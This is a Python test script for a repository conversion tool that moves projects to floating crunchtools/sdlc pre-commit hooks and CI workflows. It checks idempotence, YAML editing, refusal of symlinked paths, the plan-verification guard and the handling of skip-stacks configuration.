# A hooks file pinned to the new name converts exactly like the old-name pin.
repo = make_repo({".pre-commit-config.yaml": NEW_PINNED_HOOKS})
done = convert(repo, apply=True)
check(
    "new name: a hooks pin at crunchtools/sdlc becomes the floating hooks",
    NEW_PINNED_HOOKS != PINNED_HOOKS
    and done.returncode == 0
    and snapshot(repo)[".pre-commit-config.yaml"] == HOOKS,
    done.stderr,
)


# ------------------------------------------------------------- symlinks

# --apply writes, deletes and chmods. A checkout whose planned paths link
# elsewhere must not steer those at the runner's own files.
outside = Path(tempfile.mkdtemp()) / "victim"
outside.write_text("mine\n")
for linked in (".pre-commit-config.yaml", ".sdlc", ".github/workflows/gourmand.yml"):
    files = {".pre-commit-config.yaml": PINNED_HOOKS, ".github/workflows/ci.yml": OLD_CI}
    repo = make_repo({k: v for k, v in files.items() if k != linked})
    target = repo / linked
    target.parent.mkdir(parents=True, exist_ok=True)
    if target.exists():
        target.unlink()
    target.symlink_to(outside.parent if linked == ".sdlc" else outside)
    refused = convert(repo, apply=True)
    check(
        f"a symlinked {linked} is refused and nothing outside is touched",
        refused.returncode == REFUSED
        and outside.read_text() == "mine\n"
        and not (outside.parent / "bin").exists(),
        refused.stderr,
    )


# ------------------------------------------- review findings, one test each

# 1. A second run is a no-op even when the converted file kept other hooks.
repo = make_repo({".pre-commit-config.yaml": RUFF_AND_STANDALONE})
first = convert(repo, apply=True)
again = convert(repo, apply=True)
check(
    "a converted repo that kept other hooks: the second run exits 0 and changes nothing",
    first.returncode == 0 and again.returncode == 0 and again.stdout == "",
    again.stderr + again.stdout,
)


def load(text: str) -> dict:
    """The YAML, or {} when it does not load: a test reports, it does not crash."""
    try:
        return yaml.safe_load(text) or {}
    except yaml.YAMLError:
        return {}


# 2. A block-style default_install_hook_types is replaced whole.
block_style = "default_install_hook_types:\n  - pre-commit\n\n" + RUFF_AND_STANDALONE
repo = make_repo({".pre-commit-config.yaml": block_style})
done = convert(repo, apply=True)
written = snapshot(repo)[".pre-commit-config.yaml"]
check(
    "a block-style default_install_hook_types becomes valid YAML naming both",
    done.returncode == 0
    and load(written).get("default_install_hook_types") == ["pre-commit", "pre-push"]
    and "  - pre-commit\n" not in written.split("repos:")[0],
    done.stderr + written,
)

# 3. A `repos:` in a header comment is not where the key goes.
commented = "# repos: below are the gates\n" + RUFF_AND_STANDALONE
repo = make_repo({".pre-commit-config.yaml": commented})
done = convert(repo, apply=True)
written = snapshot(repo)[".pre-commit-config.yaml"]
check(
    "a header comment that says repos: is left as it was",
    done.returncode == 0
    and written.startswith("# repos: below are the gates\n")
    and load(written).get("default_install_hook_types") == ["pre-commit", "pre-push"],
    done.stderr + written,
)

# 4. The guard: what would be written is parsed back and held to the wiring.
_SPEC = importlib.util.spec_from_file_location("convert_repo", SCRIPT)
C = importlib.util.module_from_spec(_SPEC)
_SPEC.loader.exec_module(C)
repo = make_repo({})
good = {
    repo / ".sdlc/bin/sdlc": BOOTSTRAP,
    repo / ".pre-commit-config.yaml": HOOKS,
    repo / WF / "ci.yml": CI,
}
for label, path, text in (
    ("YAML that does not load", WF + "ci.yml", "jobs: [\n"),
    ("hooks without pre-push", ".pre-commit-config.yaml", HOOKS.replace(", pre-push]", "]")),
    ("hooks still pinned", ".pre-commit-config.yaml", PINNED_HOOKS),
    ("a ci.yml that is not the example", WF + "ci.yml", GOURMAND),
    ("another workflow beside ci.yml", WF + "gourmand.yml", GOURMAND),
    ("a `uses:` in a workflow", WF + "ci.yml", CI + "# x\n  - uses: actions/checkout@v7\n"),
):
    bad = {**good, repo / path: text}
    try:
        C.verify(repo, bad)
        refused = False
    except C.RefusedError:
        refused = True
    check(f"the guard refuses a plan with {label}", refused)
try:
    C.verify(repo, good)
    accepted = True
except C.RefusedError as exc:
    accepted = False
    print(exc)
check("the guard accepts the floating wiring", accepted)
canonical = yaml.safe_load(GATEHOUSE)
for label, jobs in (("a list", [canonical["jobs"]["guard"]]), ("a string", "guard")):
    try:
        same = C.same_gatehouse({**canonical, "jobs": jobs}, canonical)
    except AttributeError as exc:
        same = exc
    check(f"same_gatehouse: jobs as {label} is not the stub, and does not raise", same is False)


def fleet_variant(runs_on: str, review_result: str | None) -> dict:
    """The template with the guard's runner and triage's review_result as given."""
    jobs = dict(canonical["jobs"])
    jobs["guard"] = {**jobs["guard"], "runs-on": runs_on}
    if review_result is not None:
        jobs["triage"] = {**jobs["triage"], "with": {"review_result": review_result}}
    return {**canonical, "jobs": jobs}


for label, doc, same in (
    ("the guard on ubuntu-latest", fleet_variant("ubuntu-latest", None), True),
    (
        "triage handed review's result",
        fleet_variant(canonical["jobs"]["guard"]["runs-on"], "${{ needs.review.result }}"),
        True,
    ),
    (
        "both, as the fleet carries them",
        fleet_variant("ubuntu-latest", "${{ needs.review.result }}"),
        True,
    ),
    ("the guard on another runner", fleet_variant("self-hosted", None), False),
    ("triage handed something else", fleet_variant("ubuntu-latest", "${{ github.sha }}"), False),
):
    check(
        f"same_gatehouse: {label} is {'' if same else 'not '}the template",
        C.same_gatehouse(doc, canonical) is same,
    )


# ------------------------------- config: a converted repo never exits 2 at once


for label, files in (
    ("node", {"package.json": "{}\n"}),
    ("bootc", {"Containerfile": "FROM quay.io/fedora/fedora-bootc:42\n"}),
    ("bootc via ARG", {"Containerfile": "ARG B=quay.io/x/fedora-bootc\nFROM ${B}\n"}),
    ("docs", {"README.md": "# hi\n"}),
):
    repo = make_repo({**HOOKED, **files})
    first = convert(repo, apply=True)
    check(
        f"a {label} repo gets no skip-stacks: every stack is checked now",
        first.returncode == 0 and "skip-stacks" not in sdlc_cfg(repo),
        first.stderr + first.stdout,
    )

repo = make_repo(
    {
        **HOOKED,
        "Containerfile": "FROM registry.redhat.io/rhel10/rhel-bootc\n",
        "sdlc.toml": '[tool.sdlc.push]\nskip = ["constitution"]\n',
    }
)
first = convert(repo, apply=True)
check(
    "a bootc image on a registry.redhat.io base skips its build chain in ci",
    first.returncode == 0
    and (sdlc_cfg(repo).get("ci") or {}).get("skip")
    == ["container-build", "bootc-lint", "container-scan"],
    first.stderr + first.stdout,
)

# --unbuilt-stacks says which planned stacks the image still cannot check, and
# by default none: every stack is checked. A stack that is not listed is
# checked, so the skip-stacks entry an older converter wrote for it comes out,
# with its note, and nothing else does.
PROJECT = '[project]\nname = "x"\nversion = "0"\n'
EVERY_STACK_BUILT: tuple[str, ...] = ()
for config, head in (
    ("sdlc.toml", "[tool.sdlc]\n"),
    ("pyproject.toml", PROJECT + '\n[tool.sdlc]\nstacks = ["python"]\n'),
):
    repo = make_repo({**HOOKED, "package.json": "{}\n", config: head})
    wrote = convert(repo, True, "--unbuilt-stacks", "node")
    check(
        f"{config}: an unbuilt node stack writes skip-stacks and its note",
        wrote.returncode == 0
        and sdlc_cfg(repo, config).get("skip-stacks") == ["node"]
        and "# Written by crunchtools/sdlc" in snapshot(repo)[config],
        wrote.stderr,
    )
    done = convert(repo, True, *EVERY_STACK_BUILT)
    after = snapshot(repo)[config]
    check(
        f"{config}: with every stack built the skip-stacks line and its note are gone",
        done.returncode == 0
        and "skip-stacks" not in after
        and "# Written by" not in after
        and "dropped node" in done.stderr,
        done.stderr + after,
    )
    again = convert(repo, True, *EVERY_STACK_BUILT)
    check(
        f"{config}: dropping is idempotent, the second run changes nothing",
        again.returncode == 0 and again.stdout == "",
        again.stderr + again.stdout,
    )

repo = make_repo(
    {
        **HOOKED,
        "sdlc.toml": '[tool.sdlc]\nskip-stacks = ["bootc", "docs"]  # kept by hand\n',
    }
)
done = convert(repo, True, "--unbuilt-stacks", "docs")
check(
    "--unbuilt-stacks docs: only the stack now checked leaves the list, in place",
    done.returncode == 0
    and snapshot(repo)["sdlc.toml"] == '[tool.sdlc]\nskip-stacks = ["docs"]  # kept by hand\n',
    done.stderr + snapshot(repo)["sdlc.toml"],
)
again = convert(repo, True, "--unbuilt-stacks", "docs")
check("--unbuilt-stacks docs: the second run changes nothing", again.stdout == "", again.stdout)

repo = make_repo({**HOOKED, "sdlc.toml": '[tool.sdlc]\nskip-stacks = [\n  "docs",\n]\n'})
before = snapshot(repo)
refused = convert(repo, True, *EVERY_STACK_BUILT)
check(
    "a skip-stacks over several lines is refused, nothing written",
    refused.returncode == REFUSED and "not one line" in refused.stderr and snapshot(repo) == before,
    refused.stderr,
)

repo = make_repo(
    {**HOOKED, "sdlc.toml": '[tool.sdlc]\nskip-stacks = ["node", "container", "python"]\n'}
)
done = convert(repo, True, *EVERY_STACK_BUILT)
check(
    "a skip-stacks entry outside node, bootc and docs is never dropped",
    done.returncode == 0 and sdlc_cfg(repo).get("skip-stacks") == ["container", "python"],
    done.stderr + snapshot(repo)["sdlc.toml"],
)

repo = make_repo({**HOOKED, "package.json": "{}\n"})
refused = convert(repo, True, "--unbuilt-stacks", "nodes")
check(
    "--unbuilt-stacks naming an unknown stack is refused, nothing written",
    refused.returncode == REFUSED and "sdlc.toml" not in snapshot(repo),
    refused.stderr,
)

RHSM_CONTAINERFILE = (
    "FROM registry.access.redhat.com/ubi10/ubi:latest\n"
    "RUN --mount=type=secret,id=rhsm subscription-manager register && dnf -y install httpd\n"
)
repo = make_repo(
    {
        **HOOKED,
        "Containerfile": RHSM_CONTAINERFILE,
        "sdlc.toml": '[tool.sdlc.push]\nskip = ["constitution"]\n',
    }
)
first = convert(repo, apply=True)
again = convert(repo, apply=True)
cfg = sdlc_cfg(repo)
check(
    "a Containerfile that needs build secrets skips the container checks in `sdlc ci`",
    first.returncode == 0
    and cfg.get("ci", {}).get("skip") == ["container-build", "container-smoke", "container-scan"]
    and cfg.get("push", {}).get("skip") == ["constitution"],
    first.stderr + snapshot(repo).get("sdlc.toml", ""),
)
check("build secrets: the second run changes nothing", again.returncode == 0 and again.stdout == "")

repo = make_repo(
    {
        **HOOKED,
        "Containerfile": "FROM quay.io/hummingbird/python:3.14\n# no RHSM needed: UBI content only\n",
    }
)
done = convert(repo, apply=True)
check(
    "a comment that mentions RHSM is not a build secret",
    done.returncode == 0 and "sdlc.toml" not in snapshot(repo),
    done.stderr + done.stdout,
)

repo = make_repo(
    {
        **HOOKED,
        "Containerfile": RHSM_CONTAINERFILE,
        "sdlc.toml": '[tool.sdlc.ci]\nskip = ["container-scan"]\n',
    }
)
refused = convert(repo, apply=True)
check(
    "build secrets beside an existing ci skip are refused, not merged",
    refused.returncode == REFUSED and sdlc_cfg(repo)["ci"]["skip"] == ["container-scan"],
    refused.stderr,
)

COMPAT = '[project]\nname = "x"\nversion = "0"\n'
repo = make_repo({**HOOKED, "pyproject.toml": COMPAT, "package.json": "{}\n"})
done = convert(repo, apply=True)
check(
    "a Python repo naming no stacks keeps its pyproject untouched",
    done.returncode == 0 and snapshot(repo)["pyproject.toml"] == COMPAT,
    done.stderr,
)


def main() -> int:
    print()
    if FAILED:
        print(f"{len(FAILED)} FAILED")
        return 1
    print("all passed")
    return 0


if __name__ == "__main__":
    sys.exit(main())
